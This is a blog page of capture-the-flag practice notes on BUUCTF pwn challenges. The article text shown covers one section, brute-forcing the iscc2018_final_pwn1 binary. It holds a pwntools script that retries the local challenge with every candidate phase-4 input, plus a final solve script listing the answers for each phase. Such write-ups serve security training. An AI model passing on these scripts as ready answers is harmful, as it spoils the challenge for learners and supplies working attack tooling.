<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428356-83a1c402-5d90-47c5-9061-21dbdfb70471.png#averageHue=%23fdfdfd&clientId=u9d5fd636-f51f-4&from=paste&id=u0a82ff39&originHeight=389&originWidth=1102&originalType=url&ratio=1&rotation=0&showTitle=false&size=34364&status=done&style=none&taskId=uddfd1869-11e5-40cb-83f0-fc49061b283&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428357-c8d6aa76-3b0d-4600-b34e-f20b3951cfe6.png#averageHue=%23f9f9f8&clientId=u9d5fd636-f51f-4&from=paste&id=u564fb823&originHeight=308&originWidth=484&originalType=url&ratio=1&rotation=0&showTitle=false&size=21110&status=done&style=none&taskId=ua01ad11b-ff92-4d0d-b733-6417529cdc2&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428353-2f355955-f652-4d21-a8e3-17359356e91d.png#averageHue=%23272625&clientId=u9d5fd636-f51f-4&from=paste&id=uea6df970&originHeight=49&originWidth=335&originalType=url&ratio=1&rotation=0&showTitle=false&size=7298&status=done&style=none&taskId=u6de4271b-7b5c-4ebf-9646-595e408c6f8&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428353-61124d3d-4fbc-4bdd-9d2c-07a4d20db538.png#averageHue=%23262522&clientId=u9d5fd636-f51f-4&from=paste&id=u970546ad&originHeight=124&originWidth=187&originalType=url&ratio=1&rotation=0&showTitle=false&size=7039&status=done&style=none&taskId=u03147fa0-efb3-44b0-b0dd-bcfd8b27842&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428664-a3063343-3d05-4c4b-8816-4ed48ca22fc0.png#averageHue=%23282525&clientId=u9d5fd636-f51f-4&from=paste&id=u5f9b42aa&originHeight=159&originWidth=469&originalType=url&ratio=1&rotation=0&showTitle=false&size=25314&status=done&style=none&taskId=u2a60a207-f201-4fd7-8688-8ed874e693d&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429251-c78e9bca-409d-489c-a03c-4d48cef1ad37.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=u559b0eb9&originHeight=110&originWidth=691&originalType=url&ratio=1&rotation=0&showTitle=false&size=21633&status=done&style=none&taskId=u7f4bc987-5bdd-4bfa-859f-cbb674c0a34&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429250-8bd35d2a-82c9-43b7-8c51-784d2184c7b3.png#averageHue=%23292625&clientId=u9d5fd636-f51f-4&from=paste&id=u4b55510c&originHeight=169&originWidth=448&originalType=url&ratio=1&rotation=0&showTitle=false&size=23151&status=done&style=none&taskId=u69d848ef-6bde-454e-9976-cb7b879f724&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429252-97788aea-9eb4-4759-a646-f3fcbf5166c6.png#averageHue=%23262424&clientId=u9d5fd636-f51f-4&from=paste&id=ub322aed5&originHeight=42&originWidth=259&originalType=url&ratio=1&rotation=0&showTitle=false&size=7153&status=done&style=none&taskId=u5f99177f-5682-469c-b5b5-19c09e4d333&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429657-6d81f5ac-26a8-411d-a6d6-9614458cd889.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=ub5595bef&originHeight=600&originWidth=778&originalType=url&ratio=1&rotation=0&showTitle=false&size=95278&status=done&style=none&taskId=u1960e664-53c1-4e19-9f58-414b8c8ad2d&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429647-c2c22052-118c-48c7-acf9-0e0c239b44e6.png#averageHue=%23292725&clientId=u9d5fd636-f51f-4&from=paste&id=u24780b64&originHeight=305&originWidth=416&originalType=url&ratio=1&rotation=0&showTitle=false&size=40375&status=done&style=none&taskId=ued72ad98-3b65-42c6-96f9-f4c698c334d&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429805-9a011017-ef9d-446e-a6a3-ca7b6b53d094.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=u36d9f3bc&originHeight=146&originWidth=460&originalType=url&ratio=1&rotation=0&showTitle=false&size=19275&status=done&style=none&taskId=u87d92168-70e2-42fc-a984-e8d01ec815e&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430100-828eb03e-ccff-484a-a815-1f0745203d97.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=u1b7e3d86&originHeight=94&originWidth=565&originalType=url&ratio=1&rotation=0&showTitle=false&size=15033&status=done&style=none&taskId=u40a31143-4d45-477e-8f50-a7383425a56&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430237-d7acc361-7494-4506-bc29-38ac09fb917b.png#averageHue=%23292828&clientId=u9d5fd636-f51f-4&from=paste&id=u40a4ccb0&originHeight=298&originWidth=844&originalType=url&ratio=1&rotation=0&showTitle=false&size=63131&status=done&style=none&taskId=u92987b82-13a2-4ff6-b270-6c8db40debc&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430356-cea9a6f4-9979-4dac-936f-7cdcb6f379a7.png#averageHue=%23282525&clientId=u9d5fd636-f51f-4&from=paste&id=ub9f7e72e&originHeight=57&originWidth=661&originalType=url&ratio=1&rotation=0&showTitle=false&size=13205&status=done&style=none&taskId=ua25a495a-5872-4e8e-99de-3beff72a050&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430592-e7bdc2b2-107c-488d-a691-18ebc73f9da5.png#averageHue=%232a2927&clientId=u9d5fd636-f51f-4&from=paste&id=u9f0c6a98&originHeight=167&originWidth=562&originalType=url&ratio=1&rotation=0&showTitle=false&size=19305&status=done&style=none&taskId=u053dbc56-f5e5-457e-8fff-8d9ed0ed59d&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430842-0bb6de60-616d-453d-823a-ac2b6d85760b.png#averageHue=%232b2a28&clientId=u9d5fd636-f51f-4&from=paste&id=u874146dd&originHeight=221&originWidth=943&originalType=url&ratio=1&rotation=0&showTitle=false&size=49957&status=done&style=none&taskId=uf007e2fc-6ade-4dec-afe2-64aba6b89f9&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844431060-26b20394-739e-40d9-bebe-3ea81c5dcede.png#averageHue=%232b2725&clientId=u9d5fd636-f51f-4&from=paste&id=ua05920cd&originHeight=86&originWidth=522&originalType=url&ratio=1&rotation=0&showTitle=false&size=12635&status=done&style=none&taskId=ua1cab9b7-9e54-414b-a0b9-7d97c36c194&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844431379-39db2dbb-e2da-439a-b986-bfae0814d31f.png#averageHue=%232c2a29&clientId=u9d5fd636-f51f-4&from=paste&id=u3456ce49&originHeight=113&originWidth=792&originalType=url&ratio=1&rotation=0&showTitle=false&size=25170&status=done&style=none&taskId=ua56b4639-a035-41ce-a746-7ee377cfcb2&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844431779-a746966e-31c7-455d-961d-006c8a265682.png#averageHue=%232d2c2a&clientId=u9d5fd636-f51f-4&from=paste&id=u27bd5d3a&originHeight=105&originWidth=484&originalType=url&ratio=1&rotation=0&showTitle=false&size=16808&status=done&style=none&taskId=u9a086667-880e-4bf3-914e-964189b80f9&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844431751-805b5100-b42f-443a-9030-b6f13d80b8be.png#averageHue=%23282525&clientId=u9d5fd636-f51f-4&from=paste&id=ufff89311&originHeight=59&originWidth=676&originalType=url&ratio=1&rotation=0&showTitle=false&size=14678&status=done&style=none&taskId=uf74deeae-be4e-4d8b-b357-215353bbe7b&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432697-aeb8f2f4-1053-42be-ba9c-202b3b623fa7.png#averageHue=%232b2a28&clientId=u9d5fd636-f51f-4&from=paste&id=u487278d6&originHeight=157&originWidth=641&originalType=url&ratio=1&rotation=0&showTitle=false&size=26256&status=done&style=none&taskId=u09fb7a1e-d63c-485b-9a0f-99834d41d17&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432700-ff966e04-def8-4f7c-a500-edafaba8f3a6.png#averageHue=%23181615&clientId=u9d5fd636-f51f-4&from=paste&id=ue55c2101&originHeight=144&originWidth=624&originalType=url&ratio=1&rotation=0&showTitle=false&size=23904&status=done&style=none&taskId=ue34d2c33-7437-4459-9278-8dacb600e50&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432701-ce651545-7acf-4ee4-ade5-cb3cd2578b38.png#averageHue=%232b2a28&clientId=u9d5fd636-f51f-4&from=paste&id=u8923ee74&originHeight=154&originWidth=583&originalType=url&ratio=1&rotation=0&showTitle=false&size=20616&status=done&style=none&taskId=u044c0922-d627-408a-8217-ec82a5e25f1&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432706-d9e20992-926b-4374-981a-71702eb1fabf.png#averageHue=%232c2a29&clientId=u9d5fd636-f51f-4&from=paste&id=u19c7f63f&originHeight=192&originWidth=841&originalType=url&ratio=1&rotation=0&showTitle=false&size=45383&status=done&style=none&taskId=ue6315e03-1adc-4cd7-8e9c-bfa6409ba79&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432706-0a9cdcfc-3250-4f2b-a057-b01efb0bd73d.png#averageHue=%23f7f5f3&clientId=u9d5fd636-f51f-4&from=paste&id=u09561745&originHeight=81&originWidth=472&originalType=url&ratio=1&rotation=0&showTitle=false&size=11488&status=done&style=none&taskId=ub9f411f4-08ae-4ea1-afec-64fe4c7c620&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433386-e7b742a2-72a2-4a8b-82e8-7d92e1cc117f.png#averageHue=%23272625&clientId=u9d5fd636-f51f-4&from=paste&id=u88b826c5&originHeight=63&originWidth=547&originalType=url&ratio=1&rotation=0&showTitle=false&size=14190&status=done&style=none&taskId=u8abda54b-4a74-4d4c-8e88-6c1eed8ee92&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433387-cf0892e3-fdfe-4025-9a70-e2596bf35e87.png#averageHue=%23272726&clientId=u9d5fd636-f51f-4&from=paste&id=ucfdd74d5&originHeight=85&originWidth=807&originalType=url&ratio=1&rotation=0&showTitle=false&size=10174&status=done&style=none&taskId=u20ccc59e-c07f-4ea5-9cf5-7715b31e5f2&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433664-3bd6071b-891a-4092-b042-f87d92195bd2.png#averageHue=%23282525&clientId=u9d5fd636-f51f-4&from=paste&id=u3ddad2a8&originHeight=107&originWidth=679&originalType=url&ratio=1&rotation=0&showTitle=false&size=23485&status=done&style=none&taskId=ue0bfb134-b6a7-4cfd-ae32-9a8254f9c53&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433661-82100a76-21b5-4c46-a88d-3114169245b5.png#averageHue=%23282726&clientId=u9d5fd636-f51f-4&from=paste&id=ufa767ad9&originHeight=145&originWidth=745&originalType=url&ratio=1&rotation=0&showTitle=false&size=21448&status=done&style=none&taskId=ub0458633-fb21-4b40-9ebb-8f96eca24f2&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433665-7bebe58c-489c-478e-a4cb-cfd56b947a5a.png#averageHue=%23343230&clientId=u9d5fd636-f51f-4&from=paste&id=u5cc5d905&originHeight=26&originWidth=303&originalType=url&ratio=1&rotation=0&showTitle=false&size=2914&status=done&style=none&taskId=ub161cc7d-5cbb-4f81-acae-4b0005ea3bf&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844434098-19d73c18-ffa7-4f66-831f-9df585427d0a.png#averageHue=%232e2d2b&clientId=u9d5fd636-f51f-4&from=paste&id=ub95ee70f&originHeight=57&originWidth=894&originalType=url&ratio=1&rotation=0&showTitle=false&size=11442&status=done&style=none&taskId=uc526d7d7-85a7-4c26-91da-db6bf890385&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844434350-65267203-bfdf-42eb-9048-10e1762ad8b5.png#averageHue=%23252524&clientId=u9d5fd636-f51f-4&from=paste&id=u10ea4ccd&originHeight=38&originWidth=446&originalType=url&ratio=1&rotation=0&showTitle=false&size=7349&status=done&style=none&taskId=u8c12d67f-7e31-42b9-8fb3-41c36c0f795&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1662519076281-3cda0727-ab5f-4629-a35b-b3148eb94932.png#averageHue=%23fdfdfd&clientId=ue6c4f275-fcec-4&from=paste&height=384&id=u12a17878&originHeight=961&originWidth=1211&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66961&status=done&style=none&taskId=u80563590-3184-4233-891d-ff79a5e5285&title=&width=484.4">
<meta property="og:image" content="https://azraelxuemo.github.io/BUUCTF%E5%88%B7%E9%A2%98%204e962de8d79c4b56a975bfc16738e51d/Untitled%2056.png#id=iDjSw&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844294802-e0ff0aa3-a326-4b0b-a004-356ddff14d1a.png#averageHue=%23fcfcfb&clientId=u9d5fd636-f51f-4&from=paste&height=154&id=u540c7826&originHeight=193&originWidth=933&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36574&status=done&style=none&taskId=uc9166c51-1c54-4126-90ab-7b413584c83&title=&width=746.4">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844268112-ce7f2aa8-e92f-4797-8bd8-321ce9bd1153.png#averageHue=%23eae8e4&clientId=u9d5fd636-f51f-4&from=paste&height=106&id=ub4f20f9f&originHeight=133&originWidth=789&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21921&status=done&style=none&taskId=udb3c2b96-fef7-43a6-a081-60cf8806ea2&title=&width=631.2">
<meta property="article:published_time" content="2023-11-12T05:51:34.000Z">
<meta property="article:modified_time" content="2023-11-15T12:06:12.214Z">
<meta property="article:author" content="azraelxuemo">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1662712073965-28b14169-d0b9-4272-bad9-8ed60605a0a2.png#averageHue=%23fefefe&clientId=uf7ad92e3-44e8-4&from=paste&height=182&id=u66776bf9&originHeight=456&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36132&status=done&style=none&taskId=uba721f3e-5d44-4421-a032-c64858980aa&title=&width=448.4">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/favicon.ico">
    
    <title>BUUCTF pwn刷题记录 · azraelxuemo&#39;s Studio</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
    <link rel="stylesheet" href="/css/dark.css">
    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    
    <!-- 百度统计  -->
    
    <!-- Google tag (gtag.js) -->
    

<meta name="generator" content="Hexo 7.0.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
    
        <body class="post-body">
    
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        
            <div class="header-sidebar-menu">
        
            
                <div style="padding-left: 1px;">&#xe775;</div>
            
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href=/>azraelxuemo's Studio.</a>
        </span>
    </div>
    <!-- toggle banner for post layout -->
    
        
            <div class="banner">
        
            <div class="blog-title header-element">
                <a href="/">azraelxuemo&#39;s Studio.</a>
            </div>
            <div class="post-title header-element">
                <a href="#" class="post-name">BUUCTF pwn刷题记录</a>
            </div>
        </div>
    
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- back to top button -->
    <div class="footer-fixed-element">
        
            <div class="back-top back-top-hidden">
        
        
            <div>&#xe639;</div>
        
        </div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="







    height:50vh;

">
    
    <!-- 主页  -->
    
        
    <!-- 404页  -->
    
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
                BUUCTF pwn刷题记录
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
                
            <!-- 404 -->
            
        </p>
        <!-- 文章页 meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
    
        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
    
</div>

                
                <!-- 文章字数统计 -->
                
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2023/11/12</span>
                    <!-- busuanzi -->
                    
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="爆破算法"><a href="#爆破算法" class="headerlink" title="爆破算法"></a>爆破算法</h2><h3 id="iscc2018-final-pwn1"><a href="#iscc2018-final-pwn1" class="headerlink" title="iscc2018_final_pwn1"></a>iscc2018_final_pwn1</h3><p>最开始这个题目我也没太弄懂具体算法，那么我们就爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ch=&quot;qagvCYiheXulrpszNLwMtodbVx&quot;</span><br><span class="line">ta=&quot;rqzzepiwMLepiwYsLYtpqpvzLsYeM&quot;</span><br><span class="line">tar=&quot;&quot;</span><br><span class="line">import itertools</span><br><span class="line">for i in ta:</span><br><span class="line">    tar+=chr(ch.index(i)+97)</span><br><span class="line">for i in itertools.product(&quot;0123&quot;,repeat=7):</span><br><span class="line">    io.close()</span><br><span class="line">    io = process(parm)</span><br><span class="line"></span><br><span class="line">    sla(b&quot;Give me a number!\n&quot;,b&quot;8584&quot;)</span><br><span class="line">    sla(b&quot;Give me an array of numbers!\n&quot;,b&quot;[1, 1, 3, 5, 11, 21]&quot;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    sla(b&quot;phase 3... right?\n&quot;,tar)</span><br><span class="line">    sla(b&quot;time for phase 4.\n&quot;,&quot; &quot;.join(i))</span><br><span class="line">    if b&quot;Congratulations, you won! Here&#x27;s the flag:&quot; in rl():</span><br><span class="line">        print(&quot; &quot;.join(i))</span><br><span class="line">        exit(0)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ch=&quot;qagvCYiheXulrpszNLwMtodbVx&quot;</span><br><span class="line">ta=&quot;rqzzepiwMLepiwYsLYtpqpvzLsYeM&quot;</span><br><span class="line">tar=&quot;&quot;</span><br><span class="line"></span><br><span class="line">sla(b&quot;Give me a number!\n&quot;,b&quot;8584&quot;)</span><br><span class="line">sla(b&quot;Give me an array of numbers!\n&quot;,b&quot;[1, 1, 3, 5, 11, 21]&quot;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">sla(b&quot;phase 3... right?\n&quot;,tar)</span><br><span class="line">sla(b&quot;time for phase 4.\n&quot;,b&quot;0 0 0 1 1 2 1&quot;)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
